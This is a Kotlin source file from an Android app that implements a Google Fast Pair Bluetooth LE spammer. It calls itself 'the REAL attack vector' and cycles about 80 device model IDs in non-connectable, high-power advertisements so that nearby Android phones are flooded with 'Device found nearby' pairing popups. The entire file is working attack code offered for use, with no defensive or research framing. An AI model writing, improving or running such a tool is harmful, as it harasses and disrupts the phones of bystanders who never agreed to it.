package com.sunfeld.smsgateway

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.os.ParcelUuid
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.util.UUID

/**
 * Google Fast Pair protocol spammer — the REAL attack vector.
 *
 * Based on the working Bluetooth-LE-Spam (simondankelmann) implementation.
 *
 * Key differences from our broken v1/v2:
 * - Ads are NON-CONNECTABLE (matching real Fast Pair spec)
 * - Each ad broadcasts for 1-2 seconds before switching (not 250ms)
 * - No rapid stop/start — let the ad BROADCAST long enough to be seen
 * - 100+ real registered model IDs from the Flipper Zero firmware database
 * - TX power included (receivers use it for proximity calculation)
 *
 * How it works:
 * 1. Build AdvertiseData with Service UUID 0xFE2C + 3-byte model ID
 * 2. Start advertising (non-connectable, low-latency, high TX power)
 * 3. Let it broadcast for ~1 second so nearby phones pick it up
 * 4. Stop, switch to a different model ID, repeat
 *
 * Nearby Android phones with Fast Pair enabled see the half-sheet popup
 * notification — "Device found nearby: [device name]" — for EACH model ID.
 */
class FastPairSpammer {

    companion object {
        private const val TAG = "FastPairSpam"

        // Google Fast Pair Service UUID
        private val FAST_PAIR_UUID = ParcelUuid(
            UUID.fromString("0000FE2C-0000-1000-8000-00805f9b34fb")
        )

        // How long each ad broadcasts before switching to next model ID.
        // Must be long enough for nearby phones to complete a BLE scan cycle
        // and actually SEE the advertisement (~1s minimum).
        private const val AD_DWELL_MS = 1000L

        // Genuine Fast Pair model IDs from the Flipper Zero firmware database.
        // Each triggers a real "Device found nearby" popup on Android.
        val MODEL_IDS: List<Pair<String, Int>> = listOf(
            // Earbuds
            "Pixel Buds Pro" to 0xD446A7,
            "Pixel Buds A-Series" to 0x90B691,
            "Pixel Buds" to 0x92BBBD,
            "Samsung Buds2 Pro" to 0xA59076,
            "Samsung Buds Live" to 0x9AB0F6,
            "Samsung Buds Pro" to 0xEEB4A8,
            "Samsung Buds FE" to 0xCD5401,
            "Samsung Buds2" to 0xD8B0E7,
            "Samsung Galaxy Buds" to 0x72EF8D,
            "Sony WF-1000XM4" to 0x8B66AB,
            "Sony WF-1000XM5" to 0xA1C586,
            "Sony LinkBuds S" to 0x2D7A23,
            "Beats Studio Buds" to 0xA76231,
            "Beats Fit Pro" to 0xA2C9D9,
            "Beats Studio Buds+" to 0xC95400,
            "Nothing Ear 1" to 0x87B0F1,
            "Nothing Ear 2" to 0xF1B0F2,
            "Nothing Ear (stick)" to 0x5A36D8,
            "OnePlus Buds Pro" to 0xD5B5C3,
            "OnePlus Buds Pro 2" to 0xF48C5E,
            "JBL Buds Pro" to 0xF52494,
            "JBL Live 300TWS" to 0x718FA4,
            "JBL Live Pro 2" to 0x6E8E14,
            "JBL Tune 225TWS" to 0xD446A7,
            "Jabra Elite 85t" to 0xC9BD45,
            "Jabra Elite 75t" to 0x4BA774,
            "LG Tone Free T90" to 0xB5E5A1,
            "LG Tone Free FP5" to 0xC9FA98,
            "Skullcandy Indy" to 0x12F4A3,
            "Skullcandy Dime" to 0x82CCBD,
            "Anker Soundcore" to 0x91A8F4,
            "Bose QC Earbuds" to 0xF75231,
            "Bose Sport Earbuds" to 0xCA63A3,
            "Google Pixel Buds Pro 2" to 0xE2C0F3,
            // Headphones
            "Bose NC 700" to 0xCD8256,
            "Sony WH-1000XM5" to 0x5765B5,
            "Sony WH-1000XM4" to 0xDA00B4,
            "Beats Solo Pro" to 0xF52494,
            "JBL Tour One" to 0x821F66,
            "Bose QC 45" to 0x55F6E1,
            // Speakers
            "JBL Flip 6" to 0x821F66,
            "JBL Charge 5" to 0x749AAB,
            "JBL Xtreme 3" to 0x8E4F48,
            "Bose SoundLink" to 0xF45F10,
            "Google Nest Mini" to 0x0082DA,
            "Google Home" to 0x00F7D4,
            "Harman Kardon" to 0xC52C6C,
            // Watches / Trackers
            "Fossil Gen 6" to 0x3D8643,
            "Fossil Hybrid HR" to 0x3B0085,
            "TicWatch Pro 3" to 0xB5893B,
            // Automotive
            "BMW Connected" to 0xBC8ABC,
            "Audi Connect" to 0x92C47E,
            "Ford SYNC" to 0x3BAF29,
            // Misc
            "adidas RPT-02 SOL" to 0xDAE096,
            "Anker PowerConf" to 0x72FB00,
            "Marshall Major IV" to 0x1E89A7,
            "Sennheiser Momentum" to 0xB78F29,
            "AKG N400" to 0xF2020E,
            "Cleer Audio" to 0x5BA9B5,
            "Master & Dynamic" to 0xBFAA29,
            "Bang & Olufsen" to 0x5882FE,
            "Technics EAH" to 0xBA9E81,
            "Razer Hammerhead" to 0x0BCD5F,
            "HyperX Cloud" to 0x8F0E0C,
            "SteelSeries Arctis" to 0x2C89A6,
            "Corsair HS70" to 0x3E8F29,
            "Audio-Technica" to 0x4C87A3,
            "Panasonic RZ-S500W" to 0x5EC8A1,
            "Xiaomi FlipBuds Pro" to 0x2AFBE3,
            "OPPO Enco X2" to 0x3E5C8D,
            "Realme Buds Air 3" to 0xC4B2F5,
            "Huawei FreeBuds Pro" to 0x5BD3C7,
            "Vivo TWS 3 Pro" to 0x4A8FD2,
            "Motorola Buds+" to 0x62DA49,
            "Nokia E3500" to 0x7C9A3F,
            "TCL MOVEAUDIO" to 0x8B12E4,
            "Amazfit PowerBuds" to 0x9D4C71,
            "Fitbit Sense" to 0xA3DF92,
            "Garmin Venu 2" to 0xB871A5,
            "Tile Pro" to 0xC2E4B8,
        )
    }

    private val _spamCount = MutableStateFlow(0)
    val spamCount: StateFlow<Int> = _spamCount.asStateFlow()

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()

    private var advertiser: BluetoothLeAdvertiser? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var spamJob: Job? = null
    private var currentCallback: AdvertiseCallback? = null

    /** Extract 3-byte model ID from a 24-bit integer */
    private fun modelIdBytes(modelId: Int): ByteArray = byteArrayOf(
        ((modelId shr 16) and 0xFF).toByte(),
        ((modelId shr 8) and 0xFF).toByte(),
        (modelId and 0xFF).toByte()
    )

    /**
     * Start Fast Pair spam.
     *
     * Each model ID is broadcast for [AD_DWELL_MS] before switching.
     * This gives nearby phones enough time to complete a scan cycle
     * and actually trigger the popup notification.
     */
    fun start(context: Context) {
        val btManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        val adapter = btManager?.adapter

        if (adapter == null || adapter.isEnabled != true) {
            Log.e(TAG, "Bluetooth not available")
            return
        }

        advertiser = adapter.bluetoothLeAdvertiser
        if (advertiser == null) {
            Log.e(TAG, "BLE advertiser not available")
            return
        }

        _isRunning.value = true
        _spamCount.value = 0

        // Shuffle model IDs for variety, then cycle through them
        val shuffled = MODEL_IDS.shuffled().toMutableList()
        var index = 0

        spamJob = scope.launch {
            while (isActive) {
                // Pick next model ID (cycle through shuffled list)
                val (name, modelId) = shuffled[index % shuffled.size]
                index++
                // Re-shuffle when we've gone through all
                if (index % shuffled.size == 0) shuffled.shuffle()

                val data = modelIdBytes(modelId)

                try {
                    // Stop previous ad cleanly
                    stopCurrentAd()
                    delay(50) // Brief settle time

                    // NON-CONNECTABLE: This is how real Fast Pair works.
                    // Connectable=false means the ad is purely broadcast —
                    // no connection attempt, just triggers the popup.
                    val settings = AdvertiseSettings.Builder()
                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                        .setConnectable(false) // CRITICAL: must be non-connectable
                        .setTimeout(0)
                        .build()

                    val advertiseData = AdvertiseData.Builder()
                        .addServiceUuid(FAST_PAIR_UUID)
                        .addServiceData(FAST_PAIR_UUID, data)
                        .setIncludeTxPowerLevel(true)
                        .setIncludeDeviceName(false)
                        .build()

                    val callback = object : AdvertiseCallback() {
                        override fun onStartSuccess(settingsInEffect: AdvertiseSettings) {
                            _spamCount.value++
                            Log.d(TAG, "Fast Pair #${_spamCount.value}: $name (0x${String.format("%06X", modelId)})")
                        }

                        override fun onStartFailure(errorCode: Int) {
                            val errorName = when (errorCode) {
                                ADVERTISE_FAILED_DATA_TOO_LARGE -> "DATA_TOO_LARGE"
                                ADVERTISE_FAILED_TOO_MANY_ADVERTISERS -> "TOO_MANY"
                                ADVERTISE_FAILED_ALREADY_STARTED -> "ALREADY_STARTED"
                                ADVERTISE_FAILED_INTERNAL_ERROR -> "INTERNAL_ERROR"
                                ADVERTISE_FAILED_FEATURE_UNSUPPORTED -> "UNSUPPORTED"
                                else -> "UNKNOWN($errorCode)"
                            }
                            Log.w(TAG, "Fast Pair ad failed: $errorName")
                        }
                    }
                    currentCallback = callback

                    advertiser?.startAdvertising(settings, advertiseData, callback)

                    // DWELL: Let this ad broadcast long enough for nearby phones
                    // to complete a BLE scan cycle and see it (~1 second)
                    delay(AD_DWELL_MS)

                } catch (e: SecurityException) {
                    Log.e(TAG, "SecurityException", e)
                    delay(1000)
                } catch (e: Exception) {
                    Log.e(TAG, "Error in spam cycle", e)
                    delay(1000)
                }
            }
        }

        CrashLogger.log(context, TAG, "Fast Pair spam started (${MODEL_IDS.size} model IDs, ${AD_DWELL_MS}ms dwell)")
    }

    private fun stopCurrentAd() {
        currentCallback?.let { cb ->
            try {
                advertiser?.stopAdvertising(cb)
            } catch (_: Exception) { }
        }
        currentCallback = null
    }

    fun stop() {
        _isRunning.value = false
        spamJob?.cancel()
        stopCurrentAd()
        Log.d(TAG, "Fast Pair spam stopped")
    }
}
